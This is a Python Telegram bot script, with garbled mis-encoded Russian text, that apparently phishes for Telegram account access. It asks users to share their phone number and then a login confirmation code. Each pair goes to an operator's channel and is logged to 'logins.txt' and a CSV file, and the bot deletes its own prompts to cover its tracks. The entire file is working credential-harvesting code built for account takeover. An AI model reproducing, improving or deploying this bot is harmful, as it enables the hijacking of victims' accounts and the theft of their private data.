#!/usr/bin/env python3
import os
import csv
import logging
import asyncio
from datetime import datetime, timedelta

from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, ReplyKeyboardMarkup, KeyboardButton
from aiogram.fsm.context import FSMContext
from aiogram.fsm.state import State, StatesGroup
from aiogram.fsm.storage.memory import MemoryStorage
from aiogram import Router

# === –ö–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è —á–µ—Ä–µ–∑ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –æ–∫—Ä—É–∂–µ–Ω–∏—è ===
TOKEN = os.getenv("PLAY", "").strip()       # —Ç–æ–∫–µ–Ω –±–æ—Ç–∞
CHANNEL = os.getenv("CHANNEL", "").strip()  # id –∫–∞–Ω–∞–ª–∞ (–Ω–∞–ø—Ä–∏–º–µ—Ä -1003079638308)

if not TOKEN or not CHANNEL:
    raise RuntimeError("–ù—É–∂–Ω–æ –∑–∞–¥–∞—Ç—å PLAY –∏ CHANNEL –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã—Ö –æ–∫—Ä—É–∂–µ–Ω–∏—è")

CHANNEL_ID = int(CHANNEL)

# === –õ–æ–≥–∏ –∏ CSV ===
LOG_FILE = "logins.txt"
CSV_FILE = "submissions.csv"

logging.basicConfig(
    filename=LOG_FILE,
    level=logging.INFO,
    format="%(asctime)s | %(levelname)s | %(message)s"
)

if not os.path.exists(CSV_FILE):
    with open(CSV_FILE, "w", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["timestamp", "user_id", "username", "phone", "code"])

# === FSM ===
class AuthFlow(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()

# === Router ===
router = Router()
user_last_submit = {}

# === –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è ===
async def send_and_delete(message: Message, text: str, delay: int = 10, reply_markup=None):
    msg = await message.answer(text, reply_markup=reply_markup)
    await asyncio.sleep(delay)
    try:
        await msg.delete()
    except Exception:
        pass

# === /start ===
@router.message(F.text == "/start")
async def cmd_start(message: Message, state: FSMContext):
    kb = ReplyKeyboardMarkup(resize_keyboard=True)
    kb.add(KeyboardButton("üì± –û—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä", request_contact=True))
    await send_and_delete(message, "–ù–∞–∂–º–∏ –∫–Ω–æ–ø–∫—É, —á—Ç–æ–±—ã –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –Ω–æ–º–µ—Ä:", reply_markup=kb)
    await state.set_state(AuthFlow.waiting_for_phone)

# === –ü—Ä–∏—ë–º –∫–æ–Ω—Ç–∞–∫—Ç–∞ ===
@router.message(F.contact, AuthFlow.waiting_for_phone)
async def handle_contact(message: Message, state: FSMContext):
    phone = message.contact.phone_number if message.contact else None
    if not phone:
        await send_and_delete(message, "–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∫–æ–Ω—Ç–∞–∫—Ç. –ü–æ–ø—Ä–æ–±—É–π –µ—â—ë —Ä–∞–∑.")
        return
    await state.update_data(phone=phone)
    await send_and_delete(message, "–¢–µ–ø–µ—Ä—å –≤–≤–µ–¥–∏ –∫–æ–¥ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏—è (–¥–æ 6 —Ü–∏—Ñ—Ä):")
    await state.set_state(AuthFlow.waiting_for_code)

# === –ü—Ä–∏—ë–º –∫–æ–¥–∞ ===
@router.message(AuthFlow.waiting_for_code)
async def handle_code(message: Message, state: FSMContext, bot: Bot):
    uid = message.from_user.id
    now = datetime.now()

    last = user_last_submit.get(uid)
    if last and (now - last) < timedelta(hours=24):
        await send_and_delete(message, "‚è≥ –¢—ã —É–∂–µ –æ—Ç–ø—Ä–∞–≤–ª—è–ª –¥–∞–Ω–Ω—ã–µ —Å–µ–≥–æ–¥–Ω—è. –ü–æ–ø—Ä–æ–±—É–π –ø–æ–∑–∂–µ.")
        await state.clear()
        return

    code = (message.text or "").strip()
    if not code.isdigit() or len(code) > 6:
        await send_and_delete(message, "‚ùå –ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç –∫–æ–¥–∞. –í–≤–µ–¥–∏ —á–∏—Å–ª–æ–≤–æ–π –∫–æ–¥ –¥–æ 6 —Å–∏–º–≤–æ–ª–æ–≤.")
        return

    data = await state.get_data()
    phone = data.get("phone", "unknown")
    username = message.from_user.username or ""
    timestamp = now.isoformat()

    # –û—Ç–ø—Ä–∞–≤–∫–∞ –≤ –∫–∞–Ω–∞–ª
    text = (
        f"üì≤ –ù–æ–≤—ã–π –ª–æ–≥–∏–Ω:\n"
        f"–ù–æ–º–µ—Ä: {phone}\n"
        f"–ö–æ–¥: {code}\n"
        f"UserID: {uid}\n"
        f"Username: @{username}\n"
        f"–í—Ä–µ–º—è: {timestamp}"
    )
    try:
        await bot.send_message(CHANNEL_ID, text)
    except Exception as e:
        logging.exception("–ù–µ —É–¥–∞–ª–æ—Å—å –æ—Ç–ø—Ä–∞–≤–∏—Ç—å –≤ –∫–∞–Ω–∞–ª: %s", e)

    # –õ–æ–≥ –≤ —Ñ–∞–π–ª
    logging.info(f"–ù–æ–º–µ—Ä:{phone} | –ö–æ–¥:{code} | UserID:{uid} | Username:@{username}")

    # –ó–∞–ø–∏—Å—å –≤ CSV
    with open(CSV_FILE, "a", newline="", encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow([timestamp, uid, username, phone, code])

    user_last_submit[uid] = now
    await send_and_delete(message, "‚úÖ –î–∞–Ω–Ω—ã–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω—ã.")
    await state.clear()

# === –ó–∞–ø—É—Å–∫ ===
async def main():
    bot = Bot(token=TOKEN)
    dp = Dispatcher(storage=MemoryStorage())
    dp.include_router(router)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
